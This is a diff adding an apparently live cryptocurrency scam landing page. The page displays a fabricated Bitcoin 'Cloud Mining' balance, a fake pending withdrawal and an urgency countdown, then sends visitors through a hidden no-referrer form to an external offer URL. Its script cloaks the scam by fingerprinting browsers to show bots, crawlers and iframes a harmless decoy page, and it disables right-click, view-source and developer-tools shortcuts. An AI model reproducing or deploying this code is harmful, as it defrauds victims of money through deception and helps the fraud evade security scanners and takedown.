@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="referrer" content="no-referrer">
+    <title>Account Overview</title>
+    <style>
+        :root {
+            --bg: #f5f5f7;
+            --card-bg: #ffffff;
+            --card-border: #e8e8ed;
+            --text: #1d1d1f;
+            --sub: #6e6e73;
+            --accent: #02c076;
+            --accent-hover: #00a862;
+            --accent-light: rgba(2, 192, 118, 0.06);
+            --accent-border: rgba(2, 192, 118, 0.2);
+            --warning: #f5a623;
+            --warning-bg: rgba(245, 166, 35, 0.06);
+            --warning-border: rgba(245, 166, 35, 0.2);
+            --radius: 14px;
+            --shadow: 0 1px 3px rgba(0,0,0,0.04), 0 6px 20px rgba(0,0,0,0.06);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: var(--bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            min-height: 100dvh;
+            padding: 20px 16px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            touch-action: manipulation;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 420px;
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            padding: 0 4px;
+        }
+        
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: var(--accent);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+        
+        .logo-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text);
+            letter-spacing: -0.01em;
+        }
+        
+        .header-status {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--accent-light);
+            border: 1px solid var(--accent-border);
+            padding: 7px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: var(--accent);
+            font-weight: 500;
+        }
+        
+        .status-dot {
+            width: 7px;
+            height: 7px;
+            background: var(--accent);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.8); }
+        }
+        
+        .balance-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius);
+            padding: 28px 24px 20px;
+            margin-bottom: 12px;
+            text-align: center;
+            box-shadow: var(--shadow);
+        }
+        
+        .balance-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 16px;
+            background: var(--accent-light);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+        }
+        
+        .balance-label {
+            font-size: 12px;
+            color: var(--sub);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .balance-amount {
+            font-size: 38px;
+            font-weight: 700;
+            color: var(--text);
+            letter-spacing: -0.03em;
+            line-height: 1;
+            margin-bottom: 6px;
+        }
+        
+        .balance-usd {
+            font-size: 15px;
+            color: var(--sub);
+            margin-bottom: 18px;
+            font-weight: 500;
+        }
+        
+        .balance-divider {
+            width: 50px;
+            height: 1px;
+            background: var(--card-border);
+            margin: 0 auto 16px;
+        }
+        
+        .balance-status-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: var(--warning-bg);
+            border: 1px solid var(--warning-border);
+            border-radius: 20px;
+            padding: 8px 16px;
+            display: inline-flex;
+        }
+        
+        .balance-status-icon {
+            font-size: 15px;
+        }
+        
+        .balance-status-text {
+            font-size: 13px;
+            color: var(--warning);
+            font-weight: 500;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        
+        .info-item {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 10px;
+            padding: 14px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+        }
+        
+        .info-item-label {
+            font-size: 11px;
+            color: var(--sub);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        
+        .info-item-value {
+            font-size: 14px;
+            color: var(--text);
+            font-weight: 600;
+        }
+        
+        .info-item-value.green {
+            color: var(--accent);
+        }
+        
+        .timer-block {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 10px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+        }
+        
+        .timer-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .timer-icon {
+            font-size: 18px;
+        }
+        
+        .timer-label {
+            font-size: 13px;
+            color: var(--sub);
+            font-weight: 500;
+        }
+        
+        .timer-value {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text);
+            font-variant-numeric: tabular-nums;
+            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
+            letter-spacing: 0.03em;
+        }
+        
+        .timer-value.warning {
+            color: var(--warning);
+        }
+        
+        .btn-main {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: var(--accent);
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.1s ease, box-shadow 0.15s ease, background 0.15s ease;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            letter-spacing: -0.01em;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            -webkit-user-select: none;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(2, 192, 118, 0.25);
+        }
+        
+        .btn-main:active {
+            transform: scale(0.98);
+            background: var(--accent-hover);
+            box-shadow: 0 4px 16px rgba(2, 192, 118, 0.35);
+        }
+        
+        .btn-main.loading {
+            pointer-events: none;
+            opacity: 0.85;
+        }
+        
+        .btn-main .btn-arrow {
+            font-size: 18px;
+            margin-left: 4px;
+        }
+        
+        .btn-main .spinner-btn {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin: 0 auto;
+        }
+        
+        .btn-main.loading .btn-text { display: none; }
+        .btn-main.loading .btn-arrow { display: none; }
+        .btn-main.loading .spinner-btn { display: block; }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            color: #aeaeb2;
+            margin-top: 14px;
+            line-height: 1.6;
+        }
+        
+        .footer-note .lock-icon {
+            font-size: 10px;
+        }
+        
+        .initial-loader {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 14px;
+            padding: 40px 20px;
+        }
+        
+        .initial-loader .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e8e8ed;
+            border-top: 3px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        
+        .initial-loader .loading-text {
+            font-size: 14px;
+            color: var(--sub);
+            font-weight: 500;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .fade-in {
+            opacity: 0;
+            animation: fadeInUp 0.45s ease forwards;
+        }
+        
+        .fade-in-1 { animation-delay: 0.05s; }
+        .fade-in-2 { animation-delay: 0.12s; }
+        .fade-in-3 { animation-delay: 0.19s; }
+        .fade-in-4 { animation-delay: 0.26s; }
+        .fade-in-5 { animation-delay: 0.33s; }
+        
+    </style>
+</head>
+<body>
+
+    <div class="container" id="main-container">
+        <div class="initial-loader" id="initial-loader">
+            <div class="spinner"></div>
+            <div class="loading-text">Loading secure dashboard...</div>
+        </div>
+        
+        <div id="main-content" style="display: none;">
+            <div class="header fade-in fade-in-1">
+                <div class="header-logo">
+                    <div class="logo-icon">$</div>
+                    <span class="logo-text">Account Overview</span>
+                </div>
+                <div class="header-status">
+                    <span class="status-dot"></span>
+                    <span>Active</span>
+                </div>
+            </div>
+            
+            <div class="balance-card fade-in fade-in-2">
+                <div class="balance-icon">₿</div>
+                <div class="balance-label">Available Balance</div>
+                <div class="balance-amount">1.3426 BTC</div>
+                <div class="balance-usd">≈ $87,869 USD</div>
+                <div class="balance-divider"></div>
+                <div class="balance-status-row">
+                    <span class="balance-status-icon">⏳</span>
+                    <span class="balance-status-text">Pending Withdrawal Confirmation</span>
+                </div>
+            </div>
+            
+            <div class="info-grid fade-in fade-in-3">
+                <div class="info-item">
+                    <div class="info-item-label">Account ID</div>
+                    <div class="info-item-value" id="account-id">loading...</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-item-label">Source</div>
+                    <div class="info-item-value">Cloud Mining</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-item-label">Status</div>
+                    <div class="info-item-value" style="color:#f5a623;">Pending</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-item-label">Verification</div>
+                    <div class="info-item-value green">Passed ✓</div>
+                </div>
+            </div>
+            
+            <div class="timer-block fade-in fade-in-4">
+                <div class="timer-left">
+                    <span class="timer-icon">⏱</span>
+                    <span class="timer-label">Processing window</span>
+                </div>
+                <span class="timer-value" id="timer-display">02:00:00</span>
+            </div>
+            
+            <button class="btn-main fade-in fade-in-5" id="confirm-btn" onclick="handleProceed()">
+                <span class="btn-text">Proceed to Withdrawal</span>
+                <span class="btn-arrow">→</span>
+                <span class="spinner-btn"></span>
+            </button>
+            
+            <div class="footer-note fade-in fade-in-5">
+                <span class="lock-icon">🔒</span> Secure connection &bull; 256-bit encrypted<br>
+                <span>Automated confirmation system</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // ============================================
+    // НАСТРОЙКИ
+    // ============================================
+    var FINAL_OFFER_URL = 'https://zaeb.luxeblockchain.shop/pub/6/44';
+    var DELAY_BEFORE_SHOW = 2000;
+    var TIMER_HOURS = 2;
+    var TIMER_MINUTES = 0;
+    var TIMER_SECONDS = 0;
+    
+    // ============================================
+    // ПАРАМЕТРЫ URL
+    // ============================================
+    function getParams() {
+        var params = new URLSearchParams(window.location.search);
+        return {
+            token: params.get('token') || params.get('d') || generateId(8),
+            id: params.get('id') || generateId(4),
+            all: window.location.search
+        };
+    }
+    
+    var urlParams = getParams();
+    
+    function generateId(length) {
+        var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+        var result = '';
+        for (var i = 0; i < length; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+    }
+    
+    // ============================================
+    // ЗАПОЛНЕНИЕ ДАННЫХ
+    // ============================================
+    function populateData() {
+        document.getElementById('account-id').textContent = urlParams.token || generateId(8);
+    }
+    
+    // ============================================
+    // ТАЙМЕР
+    // ============================================
+    var timerInterval;
+    var remainingSeconds = TIMER_HOURS * 3600 + TIMER_MINUTES * 60 + TIMER_SECONDS;
+    
+    function pad(n) {
+        return n < 10 ? '0' + n : '' + n;
+    }
+    
+    function updateTimerDisplay() {
+        var h = Math.floor(remainingSeconds / 3600);
+        var m = Math.floor((remainingSeconds % 3600) / 60);
+        var s = remainingSeconds % 60;
+        var display = document.getElementById('timer-display');
+        display.textContent = pad(h) + ':' + pad(m) + ':' + pad(s);
+        if (remainingSeconds < 1800) display.classList.add('warning');
+    }
+    
+    function startTimer() {
+        updateTimerDisplay();
+        timerInterval = setInterval(function() {
+            remainingSeconds--;
+            if (remainingSeconds <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('timer-display').textContent = '00:00:00';
+                document.getElementById('timer-display').classList.add('warning');
+                return;
+            }
+            updateTimerDisplay();
+        }, 1000);
+    }
+    
+    // ============================================
+    // ПРОВЕРКА НА БОТА
+    // ============================================
+    var isRealUser = false;
+    
+    function checkRealUser() {
+        if (navigator.webdriver === true) return false;
+        if (!navigator.languages || navigator.languages.length === 0) return false;
+        if (screen.width < 150 || screen.height < 150) return false;
+        if ((screen.width === 1 && screen.height === 1) || (screen.width === 0 && screen.height === 0)) return false;
+        
+        var ua = navigator.userAgent;
+        var isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+        var hasTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0);
+        var hasAccelerometer = ('DeviceMotionEvent' in window || 'DeviceOrientationEvent' in window);
+        
+        if (isMobileUA && (hasTouch || hasAccelerometer)) return true;
+        
+        if (!isMobileUA) {
+            var hasPlugins = (navigator.plugins && navigator.plugins.length > 0);
+            var hasMimeTypes = (navigator.mimeTypes && navigator.mimeTypes.length > 0);
+            var hasChrome = (typeof window.chrome !== 'undefined' && window.chrome);
+            if (!hasPlugins && !hasMimeTypes && !hasChrome) return false;
+            if (navigator.hardwareConcurrency === 0) return false;
+        }
+        
+        return true;
+    }
+    
+    // ============================================
+    // НЕЙТРАЛЬНАЯ СТРАНИЦА ДЛЯ БОТОВ
+    // ============================================
+    function showNeutralPage() {
+        document.getElementById('initial-loader').style.display = 'none';
+        document.getElementById('main-content').style.display = 'block';
+        document.getElementById('main-content').innerHTML = '<div style="text-align:center;padding:40px 20px;background:#fff;border-radius:14px;border:1px solid #e8e8ed;box-shadow:0 1px 3px rgba(0,0,0,0.04),0 6px 20px rgba(0,0,0,0.06);"><div style="width:48px;height:48px;background:rgba(2,192,118,0.06);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;margin:0 auto 16px;">✓</div><h2 style="font-weight:600;font-size:18px;color:#1d1d1f;margin-bottom:8px;">Request Confirmed</h2><p style="font-size:14px;color:#6e6e73;">Your verification request has been received.</p><p style="font-size:13px;color:#aeaeb2;margin-top:8px;">No further action is needed.</p></div>';
+    }
+    
+    // ============================================
+    // ПОКАЗ РЕАЛЬНОГО КОНТЕНТА
+    // ============================================
+    function showRealContent() {
+        isRealUser = true;
+        document.getElementById('initial-loader').style.display = 'none';
+        document.getElementById('main-content').style.display = 'block';
+        populateData();
+        startTimer();
+    }
+    
+    // ============================================
+    // КНОПКА → РЕДИРЕКТ БЕЗ РЕФЕРЕРА
+    // ============================================
+    function handleProceed() {
+        if (!isRealUser) return;
+        
+        var btn = document.getElementById('confirm-btn');
+        btn.classList.add('loading');
+        
+        if (timerInterval) clearInterval(timerInterval);
+        
+        var targetUrl = FINAL_OFFER_URL + urlParams.all;
+        
+        // Скрытая форма (no-referrer)
+        var form = document.createElement('form');
+        form.method = 'GET';
+        form.action = targetUrl;
+        form.style.display = 'none';
+        document.body.appendChild(form);
+        
+        setTimeout(function() {
+            form.submit();
+        }, 100);
+        
+        // Fallback
+        setTimeout(function() {
+            window.location.replace(targetUrl);
+        }, 1500);
+    }
+    
+    window.handleProceed = handleProceed;
+    
+    // ============================================
+    // ЗАПУСК
+    // ============================================
+    setTimeout(function() {
+        if (checkRealUser()) {
+            showRealContent();
+        } else {
+            showNeutralPage();
+        }
+    }, DELAY_BEFORE_SHOW);
+    
+    // ============================================
+    // ЗАЩИТЫ
+    // ============================================
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    document.addEventListener('keydown', function(e) {
+        if ((e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'F12') {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    if (window.top !== window.self) {
+        document.getElementById('initial-loader').style.display = 'none';
+        showNeutralPage();
+    }
+    </script>
+
+</body>
+</html>
